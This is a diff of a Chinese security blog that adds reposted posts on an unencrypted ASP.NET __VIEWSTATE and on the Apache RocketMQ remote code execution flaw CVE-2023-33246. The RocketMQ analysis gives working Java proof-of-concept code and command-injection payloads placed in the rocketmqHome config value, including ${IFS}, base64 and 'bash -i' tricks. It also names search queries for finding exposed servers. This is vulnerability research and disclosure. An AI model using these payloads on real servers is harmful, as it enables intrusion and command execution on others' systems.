+<p>1.<a target="_blank" rel="noopener" href="https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s">https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s</a><br>2.<a target="_blank" rel="noopener" href="https://cloud.tencent.com/devel">https://cloud.tencent.com/devel</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Plaintext-VIEWSTATE/">
+                未加密的__VIEWSTATE参数
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="未加密的__viewstate参数">未加密的__VIEWSTATE参数</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36292543/article/details/121357450">默默提升实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="0-知识补充">0. 知识补充</span></h2><blockquote>
+<p>表单提交在遇到服务器返回错误时候，再次填写表单时，上次填写的值不会被清空。</p>
+<p>维持ViewState是ASP.NET Web Forms的默认设置。如果你想不维持ViewState，需在.aspx页面顶部包含提示&lt;%@Page EnableViewState&#x3D;“false” %&gt;，或者或者向任意控件添加属性EnableViewState&#x3D;“false” 。</p>
+<p>没有设置维持ViewState，当点击按钮提交，表单值将消失。</p>
+</blockquote>
+<h3><span id="viewstate是如何使用的">ViewState是如何使用的</span></h3><blockquote>
+<p>ViewState 基本上由服务器生成，并以隐藏的表单字段 “_VIEWSTATE” 的形式发送给客户端，用于“POST”请求。当Web应用程序进行 POST 请求时，客户端将其发送到服务器。</p>
+<p>ViewState 以序列化数据的形式出现，当客户端再次进行请求（ViewState）被发送到服务器时，将进行反序列化。</p>
+<p>为了使 ViewState 不受篡改，存在一个启用 ViewState MAC 的选项，通过设置一个值并在反序列化期间对 ViewState 的值进行完整性检查。</p>
+</blockquote>
+<h2><span id="1-漏洞描述">1. 漏洞描述</span></h2><blockquote>
+<p>__VIEWSTATE 参数未加密，存在有人拦截存储在 ViewState 中的信息的机会。</p>
+</blockquote>
+<h2><span id="2-漏洞危害">2. 漏洞危害</span></h2><blockquote>
+<p>可能导致敏感信息泄露。</p>
+</blockquote>
+<h2><span id="3-漏洞验证">3. 漏洞验证</span></h2><blockquote>
+<p>使用工具：Burp Suit，需要安装插件ViewState Editor，如下图所示：</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/1.png" alt="image"></p>
+<p>POC：{EXTRACTED_STRINGS}:string&#x3D; -2140192582</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/2.png" alt="image"></p>
+<p>查看存在该问题的页面源码，搜索__VIEWSTATE，可以看到对应的value值，对该段值进行base64解码。可以得到对应的信息，在Burp Suit中使用 ViewState Decoder插件可以进行解码。</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/3.png" alt="image"><br><img src="/2023/09/03/Plaintext-VIEWSTATE/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="其他解码工具">其他解码工具</span></h3><blockquote>
+<p>网页：<a target="_blank" rel="noopener" href="https://www.httpdebugger.com/tools/ViewstateDecoder.aspx">https://www.httpdebugger.com/tools/ViewstateDecoder.aspx</a></p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/5.png" alt="image"></p>
+<p>软件：ViewStateDecoder2.0.exe</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="4-漏洞建议">4. 漏洞建议</span></h2><blockquote>
+<p>请将machineKey验证类型设置为AES。这将使得 ASP.NET 使用AES算法加密ViewState 值。</p>
+<p>​打开 Web.Config 并在 &lt;system.web&gt; 元素下添加以下行：<machinekey validation="“AES”/">如下：</machinekey></p>
+<p><code>&lt;system.web&gt; &lt;machinekey validation=&quot;3DES&quot;&gt;&lt;/machinekey&gt;&lt;/system.web&gt;</code></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/previous-versions/dotnet/netframework-3.0/w8h3skw9%28v=vs.85%29">machineKey 元素（ASP.NET 设置架构）</a></p>
+</blockquote>
+<blockquote>
+<p>关于ViewState的相关demo案例：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RlY5HL_ak4G8EdcXyevWDg">ViewState 反序列化及其利用</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Plaintext/" rel="tag">Plaintext</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/">
+                Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-rocketmq-远程代码执行漏洞cve-2023-33246漏洞分析">Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://paper.seebug.org/2081/">Sunflower@知道创宇404实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="1漏洞介绍">1.漏洞介绍</span></h2><blockquote>
+<p>Apache RocketMQ 存在远程命令执行漏洞(CVE-2023-33246)。RocketMQ的NameServer、Broker、Controller等多个组件暴露在外网且缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。</p>
+</blockquote>
+<h2><span id="2漏洞版本">2.漏洞版本</span></h2><blockquote>
+<p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
+<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
+</blockquote>
+<h2><span id="3环境搭建">3.环境搭建</span></h2><blockquote>
+<p>使用docker拉取漏洞环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull apache/rocketmq:4.9.5</span><br></pre></td></tr></table></figure>
+
+<p>运行docker run命令，搭建docker环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.5 sh mqnamesrv</span><br><span class="line">docker run -d --name rmqbroker --<span class="built_in">link</span> rmqnamesrv:namesrv -e <span class="string">&quot;NAMESRV_ADDR=namesrv:9876&quot;</span> -p 10909:10909 -p 10911:10911 -p 10912:10912 apache/rocketmq:4.9.5 sh mqbroker -c /home/rocketmq/rocketmq-4.9.5/conf/broker.conf</span><br></pre></td></tr></table></figure>
+
+<p>docker ps检查docker正常启动即可</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="4rocketmq简介">4.RocketMQ简介</span></h2><blockquote>
+<p>我们平时使用一些体育新闻软件，会订阅自己喜欢的一些球队板块，当有作者发表文章到相关的板块，我们就能收到相关的新闻推送。</p>
+<p>发布-订阅（Pub&#x2F;Sub）是一种消息范式，消息的发送者（称为发布者、生产者、Producer）会将消息直接发送给特定的接收者（称为订阅者、消费者、Comsumer）。而RocketMQ的基础消息模型就是一个简单的Pub&#x2F;Sub模型[1]。</p>
+</blockquote>
+<h3><span id="41-rocketmq的部署模型">4.1 RocketMQ的部署模型</span></h3><blockquote>
+<p>Producer、Consumer又是如何找到Topic和Broker的地址呢？消息的具体发送和接收又是怎么进行的呢？</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="42-名字服务器-nameserver">4.2 名字服务器 NameServer</span></h3><blockquote>
+<p>NameServer是一个简单的 Topic 路由注册中心，支持 Topic、Broker 的动态注册与发现。</p>
+<p>主要包括两个功能：<br>Broker管理，NameServer接受Broker集群的注册信息并且保存下来作为路由信息的基本数据。然后提供心跳检测机制，检查Broker是否还存活；<br>路由信息管理，每个NameServer将保存关于 Broker 集群的整个路由信息和用于客户端查询的队列信息。Producer和Consumer通过NameServer就可以知道整个Broker集群的路由信息，从而进行消息的投递和消费。</p>
+</blockquote>
+<h3><span id="43-代理服务器-broker">4.3 代理服务器 Broker</span></h3><blockquote>
+<p>Broker主要负责消息的存储、投递和查询以及服务高可用保证。</p>
+<p>NameServer几乎无状态节点，因此可集群部署，节点之间无任何信息同步。Broker部署相对复杂。</p>
+<p>在 Master-Slave 架构中，Broker 分为 Master 与 Slave。一个Master可以对应多个Slave，但是一个Slave只能对应一个Master。Master 与 Slave 的对应关系通过指定相同的BrokerName，不同的BrokerId 来定义，BrokerId为0表示Master，非0表示Slave。Master也可以部署多个。</p>
+</blockquote>
+<h3><span id="44-消息收发">4.4 消息收发</span></h3><blockquote>
+<p>在进行消息收发之前，我们需要告诉客户端NameServer的地址，RocketMQ有多种方式在客户端中设置NameServer地址，举例三个，优先级由高到低，高优先级会覆盖低优先级。</p>
+<p>代码中指定Name Server地址，多个namesrv地址之间用分号分割</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">producer.setNamesrvAddr(<span class="string">&quot;192.168.0.1:9876;192.168.0.2:9876&quot;</span>);  </span><br><span class="line">consumer.setNamesrvAddr(<span class="string">&quot;192.168.0.1:9876;192.168.0.2:9876&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Java启动参数中指定Name Server地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Drocketmq.namesrv.addr=192.168.0.1:9876;192.168.0.2:9876  </span><br></pre></td></tr></table></figure>
+
+<p>环境变量指定Name Server地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> NAMESRV_ADDR=192.168.0.1:9876;192.168.0.2:9876</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="45-漏洞主要涉及的类的介绍">4.5 漏洞主要涉及的类的介绍</span></h3><h4><span id="451-defaultmqadminext">4.5.1 DefaultMQAdminExt</span></h4><blockquote>
+<p>DefaultMQAdminExt是 RocketMQ 提供的一个扩展类。它提供了一些管理和操作 RocketMQ 的工具方法，可以用于管理主题（Topic）、消费者组（Consumer Group）、订阅关系等。</p>
+<p>DefaultMQAdminExt类提供了一些常用的方法，包括创建和删除主题、查询主题信息、查询消费者组信息、更新订阅关系等。它可以通过与 NameServer 交互来获取和修改相关配置信息，并提供了对 RocketMQ 的管理功能。</p>
+<p>例如DefaultMQAdminExt更新broker配置的一个方法（更新的配置文件为broker.conf）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateBrokerConfig</span><span class="params">(String brokerAddr,</span></span><br><span class="line"><span class="params">    Properties properties)</span> <span class="keyword">throws</span> RemotingConnectException, RemotingSendRequestException,</span><br><span class="line">    RemotingTimeoutException, UnsupportedEncodingException, InterruptedException, MQBrokerException &#123;</span><br><span class="line">    defaultMQAdminExtImpl.updateBrokerConfig(brokerAddr, properties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="452-filterservermanager">4.5.2 FilterServerManager</span></h4><blockquote>
+<p>在 Apache RocketMQ 中，FilterServerManager 类是用于管理过滤服务器（Filter Server）的类。过滤服务器是 RocketMQ 中的一种组件，用于支持消息过滤功能。过滤服务器负责处理消息过滤规则的注册、更新和删除，以及消息过滤的评估和匹配。</p>
+</blockquote>
+<h2><span id="5漏洞分析">5.漏洞分析</span></h2><blockquote>
+<p>补丁文件[2]中直接将Filter Server模块全部移除，所以我们可以直接来看FilterServerManager，简要分析一下FilterServerManager的调用流程：</p>
+<p>在Broker启动时执行sh mqbroker…，调用到BrokerStartup类：</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/3.png" alt="image"></p>
+<p>在该类中继续调用到BrokerController中的start()方法</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/4.png" alt="image"></p>
+<p>继续跟进</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/5.png" alt="image"></p>
+<p>最终到了FilterServerManager类中，其中FilterServerUtil.callShell();存在命令执行:</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.scheduledExecutorService.scheduleAtFixedRate(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FilterServerManager.<span class="built_in">this</span>.createFilterServer();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span> * <span class="number">5</span>, <span class="number">1000</span> * <span class="number">30</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createFilterServer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">more</span> <span class="operator">=</span></span><br><span class="line">        <span class="built_in">this</span>.brokerController.getBrokerConfig().getFilterServerNums() - <span class="built_in">this</span>.filterServerTable.size();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="built_in">this</span>.buildStartCommand();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; more; i++) &#123;</span><br><span class="line">        FilterServerUtil.callShell(cmd, log);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">buildStartCommand</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">config</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (BrokerStartup.configFile != <span class="literal">null</span>) &#123;</span><br><span class="line">        config = String.format(<span class="string">&quot;-c %s&quot;</span>, BrokerStartup.configFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.brokerController.getBrokerConfig().getNamesrvAddr() != <span class="literal">null</span>) &#123;</span><br><span class="line">        config += String.format(<span class="string">&quot; -n %s&quot;</span>, <span class="built_in">this</span>.brokerController.getBrokerConfig().getNamesrvAddr());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (RemotingUtil.isWindowsPlatform()) &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;start /b %s\\bin\\mqfiltersrv.exe %s&quot;</span>,</span><br><span class="line">            <span class="built_in">this</span>.brokerController.getBrokerConfig().getRocketmqHome(),</span><br><span class="line">            config);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;sh %s/bin/startfsrv.sh %s&quot;</span>,</span><br><span class="line">            <span class="built_in">this</span>.brokerController.getBrokerConfig().getRocketmqHome(),</span><br><span class="line">            config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p><img src="/2022/08/25/Slowhttptest-Usage/2.png" alt="image"></p>
+<p>根据start()方法内部可知createFilterServer方法每隔30秒都会被调用一次，</p>
 </blockquote>
-<h2><span id="不得不说">不得不说</span></h2><blockquote>
-<p>其实 Dos 类的漏洞你很不好说，因为访问量过大必然服务器承受不住，这个只能做缓解（流量分析、请求时限、扩容等等）<br>所以漏扫出来是否存在这个漏洞或者 slowhttptest 的<code>service available:   NO</code>，有可能是看片面了（某些请求在开始或者后来被识别后被拒绝、中断，或者网页响应时间是否有某个范围内的增量变化等，尤其是这个增量变化，我曾经发现因为一个资产页面正常请求的数量会变化，时延直接从几百ms级变成几s级的）</p>
-<p>好吧，okk</p>
-<p><img src="/2022/08/25/Slowhttptest-Usage/2.jpg" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.scheduledExecutorService.scheduleAtFixedRate(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FilterServerManager.<span class="built_in">this</span>.createFilterServer();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span> * <span class="number">5</span>, <span class="number">1000</span> * <span class="number">30</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>到了这一步，很明显我们只需要控制BrokerConfig进行命令拼接，等待触发createFilterServer即可造成RCE。</p>
+<p>但是要想成功触发命令执行还有两个问题需要解决一下：</p>
+<p>1、在createFilterServer方法中，more的值要大于0才会触发callShell方法</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createFilterServer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">more</span> <span class="operator">=</span></span><br><span class="line">        <span class="built_in">this</span>.brokerController.getBrokerConfig().getFilterServerNums() - <span class="built_in">this</span>.filterServerTable.size();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="built_in">this</span>.buildStartCommand();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; more; i++) &#123;</span><br><span class="line">        FilterServerUtil.callShell(cmd, log);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里只需要通过DefaultMQAdminExt设置filterServerNums的值即可，大致为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">properties.setProperty(<span class="string">&quot;filterServerNums&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="type">DefaultMQAdminExt</span> <span class="variable">defaultMQAdminExt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQAdminExt</span>();</span><br><span class="line">...</span><br><span class="line">defaultMQAdminExt.updateBrokerConfig(<span class="string">&quot;192.168.87.128:10911&quot;</span>, props);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>2、callshell方法传入命令时，shellString会被splitShellString方法使用空格进行拆分为一个cmdArray数组。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">callShell</span><span class="params">(<span class="keyword">final</span> String shellString, <span class="keyword">final</span> InternalLogger log)</span> &#123;</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] cmdArray = splitShellString(shellString);</span><br><span class="line">        process = Runtime.getRuntime().exec(cmdArray);</span><br><span class="line">        process.waitFor();</span><br><span class="line">        log.info(<span class="string">&quot;CallShell: &lt;&#123;&#125;&gt; OK&quot;</span>, shellString);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;CallShell: readLine IOException, &#123;&#125;&quot;</span>, shellString, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != process)</span><br><span class="line">            process.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>意味着传入的命令如果带了空格，都会被拆分为数组，而数组在exec中会将每个命令的结尾标记为下一个命令的开头[3]。</p>
+<p><code>sh &#123;可控&#125;/bin/startfsrv.sh ...</code> 如果传入 <code>-c curl 127.0.0.1;</code></p>
+<p>那么comArray为 <code>[&#39;sh&#39; &#39;-c&#39; &#39;curl&#39; &#39;127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;]</code></p>
+<p>这里的每个命令的结尾作为下一个命令的开头，它将每个被传入的命令都看作为一个整体，想不出一个更合适的例子，这里可以使用shell里的单引号括起来进行辅助理解：</p>
+<p><code>&#39;sh&#39; &#39;-c&#39; &#39;curl&#39; &#39;127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;</code></p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/6.png" alt="image"></p>
+<p>很明显，这里的curl因为使用了空格，导致curl 127.0.0.1被拆分为了两个部分，正确的写法应该是：</p>
+<p><code>&#39;sh&#39; &#39;-c&#39; &#39;curl 127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;</code></p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/7.png" alt="image"></p>
+<p>但是使用空格又会被split，所以现在的问题点就在于如何避免使用空格进行完整的传参，网上公开的解法[4]：</p>
+<p><code>-c $@|sh . echo curl 127.0.0.1;</code></p>
+<p><code>$@</code> 作为一个特殊变量，它表示传递给脚本或命令的所有参数，直接将echo后面的值作为一个整体传递给$@，解决了拆分命令的问题。</p>
+<p>感谢longofo@知道创宇404实验室带我探讨出第二个绕过方法：</p>
+<p>顺便一提，这个绕过的核心点在于这里如果不使用bash，则无法成功使用${IFS}以及{}进行绕过空格限制，这里就不再进行细节讲解，感兴趣的师傅可以动手试试：</p>
+<p><code>-c bash$&#123;IFS&#125;-c$&#123;IFS&#125;\&quot;&#123;echo,dG91Y2ggL3RtcC9kZGRkZGRkYWE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;;</code></p>
+</blockquote>
+<h3><span id="51-payload构造">5.1 payload构造</span></h3><blockquote>
+<p>根据上面的知识，最终构造的payload为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">properties.setProperty(<span class="string">&quot;filterServerNums&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;rocketmqHome&quot;</span>,<span class="string">&quot;-c bash$&#123;IFS&#125;-c$&#123;IFS&#125;\&quot;&#123;echo,dG91Y2ggL3RtcC9kZGRkZGRkYWE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;;&quot;</span>);</span><br><span class="line"><span class="type">DefaultMQAdminExt</span> <span class="variable">defaultMQAdminExt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQAdminExt</span>();</span><br><span class="line">defaultMQAdminExt.setNamesrvAddr(<span class="string">&quot;localhost:9876&quot;</span>);</span><br><span class="line">defaultMQAdminExt.start();</span><br><span class="line">defaultMQAdminExt.updateBrokerConfig(<span class="string">&quot;192.168.87.128:10911&quot;</span>, properties);</span><br><span class="line">defaultMQAdminExt.shutdown();</span><br></pre></td></tr></table></figure>
+
+<h3><span id="52-漏洞验证">5.2 漏洞验证</span></h3><blockquote>
+<p>使用payload进行curl dnslog，每隔30s左右收到一次请求：</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="53-漏洞修复">5.3 漏洞修复</span></h3><blockquote>
+<p>在修复版本4.9.6和5.1.1中都是直接删除了filter server模块</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="54-影响范围统计">5.4 影响范围统计</span></h3><blockquote>
+<p>使用Zoomeye[5]进行搜索，得到ip结果34348条：<br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=service:%22RocketMQ%22">https://www.zoomeye.org/searchResult?q=service%3A%22RocketMQ%22</a><br><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/10.png" alt="image"></p>
+<p>使用Zoomeye搜索一下被攻击过的目标数量，得到ip结果6011条：<br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=service:%22RocketMQ%22+%22rocketmqHome=-c%20$@%7Csh%22">https://www.zoomeye.org/searchResult?q=service%3A%22RocketMQ%22%2B%22rocketmqHome%3D-c%20%24%40%7Csh%22</a><br><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/11.png" alt="image"></p>
+<p>通过Zoomeye的下载功能，再来本地统计一下攻击手法。这里大部分都是通过wget、curl等指令下载木马进行执行反弹shell。</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/12.png" alt="image"></p>
+</blockquote>
+<h2><span id="6参考链接">6.参考链接</span></h2><blockquote>
+<p>[1] <a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/tree/rocketmq-all-4.5.1/docs/cn">https://github.com/apache/rocketmq/tree/rocketmq-all-4.5.1/docs/cn</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc">https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/48011611/what-exactly-can-we-store-inside-of-string-array-in-process-exec">https://stackoverflow.com/questions/48011611/what-exactly-can-we-store-inside-of-string-array-in-process-exec</a></p>
